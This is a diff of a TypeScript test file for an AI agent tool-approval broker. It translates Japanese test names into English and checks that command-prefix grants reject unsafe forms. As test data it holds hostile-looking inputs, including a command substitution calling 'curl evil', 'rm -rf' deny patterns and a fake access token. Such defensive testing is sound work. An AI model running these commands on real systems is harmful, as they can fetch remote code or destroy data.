@@ -19,7 +19,7 @@ import {
   type ApprovalPolicy,
   type GrantSubject
 } from '../src/shared/thread.js'
-import { ApprovalBroker, type ApprovalRequestInput } from '../src/main/approval/broker.js'
+import { ApprovalBroker, type ApprovalRequestInput, type ApprovalRole } from '../src/main/approval/broker.js'
 import {
   grantCommandHash,
   grantRowOf,
@@ -74,8 +74,8 @@ function ctx(over: Partial<GrantMatchContext> = {}): GrantMatchContext {
 
 const cmd = (command: string): GrantSubject => ({ kind: 'command', command })
 
-describe('照合の純関数 (grants.ts)', () => {
-  it('前方一致は語の境で当てる', () => {
+describe('pure matching functions (grants.ts)', () => {
+  it('prefix match applies at word boundaries', () => {
     const rows = [row({ subject: 'docker build' })]
     expect(matchGrant(cmd('docker build -t x .'), rows, ctx())).not.toBeNull()
     expect(matchGrant(cmd('docker build'), rows, ctx())).not.toBeNull()
@@ -83,7 +83,7 @@ describe('照合の純関数 (grants.ts)', () => {
     expect(matchGrant(cmd('docker run x'), rows, ctx())).toBeNull()
   })
 
-  it('許した前方一致でも、区切りの残りに任意の実行の動詞があれば通さない (旗を挟んでも)', () => {
+  it('even for an allowed prefix, does not pass if the rest of a segment has any arbitrary-execution verb (even with flags in between)', () => {
     const rows = [row({ subject: 'docker compose' })]
     expect(matchGrant(cmd('docker compose up -d'), rows, ctx())).not.toBeNull()
     expect(matchGrant(cmd('docker compose -f x.yml run app sh'), rows, ctx())).toBeNull()
@@ -103,7 +103,7 @@ describe('照合の純関数 (grants.ts)', () => {
     expect(prefixReadable('docker compose up &')).toBe(false)
   })
 
-  it('全部の区切りが許可か聞かない定番に当たるときだけ通す', () => {
+  it('passes only when every segment hits an allowed or no-ask standard', () => {
     const rows = [row({ subject: 'docker build' })]
     expect(matchGrant(cmd('docker build . && docker push x'), rows, ctx())).toBeNull()
     expect(matchGrant(cmd('cd app && docker build .'), rows, ctx({ quietSegment: (s) => s.startsWith('cd ') }))).not.toBeNull()
@@ -111,7 +111,7 @@ describe('照合の純関数 (grants.ts)', () => {
     expect(matchGrant(cmd('docker build . && docker push x'), two, ctx())?.map((r) => r.id)).toEqual(['a', 'b'])
   })
 
-  it('読めない形 (コマンド置換・& ・ファイルへの書き出し・ヒアドキュメント・括弧) は前方一致に使わない', () => {
+  it('unreadable forms (command substitution, &, writing to a file, heredoc, parentheses) are not used for prefix matches', () => {
     const rows = [row({ subject: 'docker build' })]
     for (const command of [
       'docker build $(curl evil)',
@@ -128,7 +128,7 @@ describe('照合の純関数 (grants.ts)', () => {
     expect(prefixReadable('docker build . 2>&1 > /dev/null')).toBe(true)
   })
 
-  it('処理系・シェル・包み・外への道の道具は前方一致を作らず、表にあっても効かない', () => {
+  it('tools for interpreters, shells, wrappers, and ways out do not make prefix matches and have no effect even if in the table', () => {
     expect(prefixOf('python3 run.py')).toBeNull()
     expect(prefixOf('bash -c "x"')).toBeNull()
     expect(prefixOf('env FOO=1 make')).toBeNull()
@@ -140,7 +140,7 @@ describe('照合の純関数 (grants.ts)', () => {
     expect(matchGrant(cmd('python3 evil.py'), [{ ...row({}), subject: 'python3' }], ctx())).toBeNull()
   })
 
-  it('提案は区切りの頭の語 + 下位コマンド。2 語目が旗・パスなら全体の完全一致', () => {
+  it("a suggestion is the segment's head word + the subcommand; if the second word is a flag or path it is an exact match of the whole", () => {
     expect(prefixOf('docker build -t x .')).toBe('docker build')
     // A separator that is a single word is not prefix-matched (allowing `rm` would also pass `rm -rf …`; wave 89 security review).
     expect(prefixOf('terraform')).toBeNull()
@@ -182,7 +182,7 @@ describe('照合の純関数 (grants.ts)', () => {
     expect(matchGrant(cmd('python3 run.py --evil'), rows, ctx())).toBeNull()
   })
 
-  it('秘密を含む値は行にしない', () => {
+  it('does not make a row from a value that contains a secret', () => {
     expect(proposeGrants(cmd('docker login ghp_abcdefghijklmnopqrstuvwxyz0123456789'), [], ctx())).toEqual({
       candidates: [expect.objectContaining({ subjectKind: 'command-prefix', subject: 'docker login' })]
     })
@@ -190,7 +190,7 @@ describe('照合の純関数 (grants.ts)', () => {
     expect(secret).toEqual({ refused: 'secret' })
   })
 
-  it('パスはディレクトリの前方一致 (/ の境)。write は read を含む', () => {
+  it('paths are directory prefix matches (at the / boundary); write includes read', () => {
     expect(pathUnder('/a/b/c.txt', '/a/b')).toBe(true)
     expect(pathUnder('/a/b', '/a/b')).toBe(true)
     expect(pathUnder('/a/bc/x', '/a/b')).toBe(false)
@@ -210,7 +210,7 @@ describe('照合の純関数 (grants.ts)', () => {
     expect(proposeGrants({ kind: 'path', access: 'write', path: '/x', directory: false }, [], ctx())).toEqual({ refused: 'none' })
   })
 
-  it('親が広すぎる path-prefix は提案せず、ファイル自身にする (ホーム・祖先・ルート直下・ホームの dot ディレクトリ)', () => {
+  it('does not suggest a path-prefix whose parent is too broad and uses the file itself (home, ancestors, directly under root, dot directories in home)', () => {
     const file = (path: string, access: 'read' | 'write' = 'write'): GrantSubject => ({ kind: 'path', access, path, directory: false })
     const own = (path: string, access: 'read' | 'write' = 'write') => ({
       candidates: [{ subjectKind: 'path-prefix', subject: path, subjectHash: null, access }]
@@ -227,7 +227,7 @@ describe('照合の純関数 (grants.ts)', () => {
     expect(proposeGrants({ kind: 'path', access: 'read', path: '/home/u', directory: true }, [], ctx())).toEqual({ refused: 'none' })
   })
 
-  it('ラッパー・実行の下位コマンドは前方一致にしない (提案と照合で同じ判定)', () => {
+  it('wrappers and executing subcommands do not become prefix matches (the same judgment for suggestion and matching)', () => {
     for (const command of [
       'timeout 5 rm -rf x', 'nice make', 'npx tsc', 'env X=1 make', 'xargs rm', 'sudo make', 'uv run script.py', 'poetry run pytest',
       'npm exec foo', 'pnpm exec foo', 'yarn exec foo', 'bundle exec rake', 'cargo run', 'npm run', 'yarn run'
@@ -241,7 +241,7 @@ describe('照合の純関数 (grants.ts)', () => {
     expect(sanitizeGrantRow(row({ subject: 'cargo build' }))).not.toBeNull()
   })
 
-  it('パスは realpath で解く (symlink の先で照合する)', () => {
+  it('paths are resolved with realpath (matched at the symlink target)', () => {
     const root = realpathSync(mkdtempSync(join(tmpdir(), 'aios-grants-')))
     try {
       mkdirSync(join(root, 'proj'))
@@ -262,7 +262,7 @@ describe('照合の純関数 (grants.ts)', () => {
     }
   })
 
-  it('期限の過ぎた「今日だけ」と別の会話の「この会話だけ」は効かない', () => {
+  it('an expired "today only" and another conversation\'s "this conversation only" do not apply', () => {
     const today = row({ scope: 'today', expiresAt: nextLocalMidnight(NOW) })
     expect(matchGrant(cmd('docker build .'), [today], ctx())).not.toBeNull()
     expect(matchGrant(cmd('docker build .'), [today], ctx({ now: nextLocalMidnight(NOW) }))).toBeNull()
@@ -272,13 +272,13 @@ describe('照合の純関数 (grants.ts)', () => {
     expect(nextLocalMidnight(NOW)).toBe(new Date(2026, 10, 16, 0, 0, 0).getTime())
   })
 
-  it('role・道具の名前が違う行は効かない', () => {
+  it('rows with a different role or tool name do not apply', () => {
     const rows = [row({ subject: 'docker build' })]
     expect(matchGrant(cmd('docker build .'), rows, ctx({ roleKey: 'job:B' }))).toBeNull()
     expect(matchGrant(cmd('docker build .'), rows, ctx({ toolName: 'Other' }))).toBeNull()
   })
 
-  it('食い違う行は読み込みで落ちる', () => {
+  it('contradictory rows are dropped at load', () => {
     expect(sanitizeGrantRow(row({}))).not.toBeNull()
     expect(sanitizeGrantRow(row({ scope: 'thread', threadId: null }))).toBeNull()
     expect(sanitizeGrantRow(row({ scope: 'today', expiresAt: null }))).toBeNull()
@@ -290,7 +290,7 @@ describe('照合の純関数 (grants.ts)', () => {
     expect(sanitizeGrantRow(row({ subjectKind: 'path-prefix', subject: 'rel', access: 'read' }))).toBeNull()
   })
 
-  it('grantSubjectFor: シェル・書き込み・読み込み・Web の取得・それ以外', () => {
+  it('grantSubjectFor: shell, write, read, Web fetch, and others', () => {
     const table: GrantTable = {
       shellTools: ['Sh'],
       commandField: 'command',
@@ -392,8 +392,8 @@ async function settle(): Promise<void> {
   await new Promise((resolve) => setTimeout(resolve, 0))
 }
 
-describe('Broker の段 2.7 (TODO 983)', () => {
-  it('受け入れ条件: role A で許した操作が role B では承認待ちになる', async () => {
+describe('Broker stage 2.7 (TODO 983)', () => {
+  it('acceptance condition: an operation allowed in role A waits for approval in role B', async () => {
     const store = new MemoryGrants()
     const { broker } = makeBroker(store)
     const first = broker.request(bash('docker build .'))
@@ -420,7 +420,7 @@ describe('Broker の段 2.7 (TODO 983)', () => {
     expect(broker.list()[1]?.roleGrant).toBeUndefined()
   })
 
-  it('再起動の後も置き場の行が効く (読み込みで検証する)', async () => {
+  it("the location's rows still apply after a restart (verified at load)", async () => {
     const store = new MemoryGrants()
     store.rows.push(grantRowOf({ subjectKind: 'command-prefix', subject: 'docker build', subjectHash: null, access: null }, 'job:A', 'Bash', 'forever', 't1', NOW))
     store.rows.push(row({ id: 'bad', subject: 'ruby' }))
@@ -431,7 +431,7 @@ describe('Broker の段 2.7 (TODO 983)', () => {
     expect(broker.list()).toHaveLength(1)
   })
 
-  it('段 0 の線・停止パターン・sandbox の外は表があっても今までどおり', async () => {
+  it('the stage 0 line, stop patterns, and outside the sandbox stay as before even with a table', async () => {
     const store = new MemoryGrants()
     store.rows.push(row({ subject: 'docker build' }))
     store.rows.push(row({ id: 'tool', toolName: 'mcp__x__send', subjectKind: 'tool', subject: 'mcp__x__send' }))
@@ -461,7 +461,7 @@ describe('Broker の段 2.7 (TODO 983)', () => {
     await expect(broker.request(bash('docker build .', { unsandboxed: true }))).resolves.toMatchObject({ allowed: false, by: 'system' })
   })
 
-  it('renderer の偽の allow-role (条件に合わない要求・role の無い会話) は 1 回の許可に落ち、行を作らない', async () => {
+  it('a fake allow-role from the renderer (a request that does not meet the conditions, a conversation without a role) falls to a one-time allow and makes no row', async () => {
     const store = new MemoryGrants()
     const { broker } = makeBroker(store, { ...DEFAULT_APPROVAL_POLICY, bashDenyPatterns: ['rm -rf'] })
     const denied = broker.request(bash('rm -rf build'))
@@ -481,7 +481,7 @@ describe('Broker の段 2.7 (TODO 983)', () => {
     expect(store.rows).toHaveLength(0)
   })
 
-  it('値は積んだときに main が決めたもの。今日だけ・この会話だけの期限が付く', async () => {
+  it('the value is what main decided when queueing; "today only" and "this conversation only" get an expiry', async () => {
     const store = new MemoryGrants()
     const { broker } = makeBroker(store)
     void broker.request(bash('docker build .'))
@@ -500,7 +500,7 @@ describe('Broker の段 2.7 (TODO 983)', () => {
     expect(broker.list().map((entry) => entry.threadId)).toEqual(['t6'])
   })
 
-  it('許可を足したら同じ role で積んである要求を解く (別の role・通らないものは残す)', async () => {
+  it('adding an allow resolves requests queued under the same role (other roles and those that do not pass remain)', async () => {
     const { broker } = makeBroker()
     const first = broker.request(bash('docker build .'))
     const sameRole = broker.request(bash('docker build -t z .', { threadId: 't2' }))
@@ -514,7 +514,7 @@ describe('Broker の段 2.7 (TODO 983)', () => {
     expect(broker.list().map((entry) => entry.threadId)).toEqual(['t3', 't4'])
   })
 
-  it('自分の提案を持たない待ち (秘密で提案が作れなかった) も、同じ role なら新しい表で見直して解く', async () => {
+  it('a wait with no proposal of its own (a proposal could not be made because of a secret) is also re-examined with the new table and resolved if the role is the same', async () => {
     const { broker } = makeBroker()
     const write = (path: string, threadId: string): ApprovalRequestInput => ({
       threadId,
@@ -536,7 +536,7 @@ describe('Broker の段 2.7 (TODO 983)', () => {
     await expect(noOffer).resolves.toMatchObject({ allowed: true, by: 'rule' })
   })
 
-  it('厳格でない role の既定の外の道具 (not-default) にも出る。読み書きのパス・ホスト', async () => {
+  it('also shown for tools outside the default of a non-strict role (not-default); read / write paths and hosts', async () => {
     const store = new MemoryGrants()
     const { broker } = makeBroker(store, STRICT_OFF)
     void broker.request({
@@ -580,7 +580,7 @@ describe('Broker の段 2.7 (TODO 983)', () => {
     expect(broker.list()).toHaveLength(1)
   })
 
-  it('置き場に書けなければメモリにも足さない', async () => {
+  it('does not add to memory if it cannot write to the location', async () => {
     const failing: RoleGrantPersistence = {
       loadRoleGrants: () => [],
       addRoleGrants: () => {
@@ -599,8 +599,8 @@ describe('Broker の段 2.7 (TODO 983)', () => {
   })
 })
 
-describe('gateway の approve の段が role と対象を載せる', () => {
-  async function approveWith(role: { key: string; name: string } | null, strict = true): Promise<ApprovalRequestInput | null> {
+describe('the gateway approve stage carries the role and the subject', () => {
+  async function approveWith(role: ApprovalRole | null, strict = true): Promise<ApprovalRequestInput | null> {
     let seen: ApprovalRequestInput | null = null
     const live = { pendingApprovals: new Set<string>(), state: 'running' } as unknown as GatewayLiveHandle
     const host: Partial<GatewayRequestHost> = {
@@ -632,10 +632,14 @@ describe('gateway の approve の段が role と対象を載せる', () => {
     return seen
   }
 
-  it('role のある会話だけ role と grantSubject を載せる', async () => {
+  it('carries role and grantSubject only for conversations that have a role', async () => {
     const withRole = await approveWith(ROLE_A)
     expect(withRole?.role).toEqual(ROLE_A)
-    expect(withRole?.grantSubject).toEqual({ kind: 'command', command: 'docker build .' })
+    // Stage 4: a role conversation also carries only the entry point (built when the broker consults the table).
+    expect(withRole?.grantSubject).toBeUndefined()
+    expect(withRole?.grantSubjectOf?.()).toEqual({ kind: 'command', command: 'docker build .' })
+    // A non-strict role conversation carries it too (the table is consulted whether or not strict).
+    expect((await approveWith(ROLE_A, false))?.grantSubjectOf?.()).toEqual({ kind: 'command', command: 'docker build .' })
     // A strict conversation with no role carries only the entry point that builds the target, for "do not ask in this conversation" (stage 3). It carries no role. Building happens only when the broker needs it.
     const without = await approveWith(null)
     expect(without?.role).toBeUndefined()
@@ -649,8 +653,8 @@ describe('gateway の approve の段が role と対象を載せる', () => {
   })
 })
 
-describe('IPC の受け口 (asDecision)', () => {
-  it('allow-role は期限だけを受け、知らない期限は 1 回の許可に落とす', () => {
+describe('IPC entry (asDecision)', () => {
+  it('allow-role accepts only an expiry and drops an unknown expiry to a one-time allow', () => {
     expect(asDecision({ kind: 'allow-role', scope: 'today' })).toEqual({ kind: 'allow-role', scope: 'today' })
     expect(asDecision({ kind: 'allow-role', scope: 'forever', subject: 'rm' })).toEqual({ kind: 'allow-role', scope: 'forever' })
     expect(asDecision({ kind: 'allow-role', scope: 'year' })).toEqual({ kind: 'allow' })
@@ -658,13 +662,13 @@ describe('IPC の受け口 (asDecision)', () => {
   })
 })
 
-describe('migration 43 と RoleGrantStore', () => {
+describe('migration 43 and RoleGrantStore', () => {
   const opened: Database.Database[] = []
   afterEach(() => {
     for (const db of opened.splice(0)) db.close()
   })
 
-  it('role_grants を作り、41 から当て直せる。行は往復する', () => {
+  it('creates role_grants and can reapply from 41; rows round-trip', () => {
     const db = new Database(':memory:')
     opened.push(db)
     runMigrations(db)
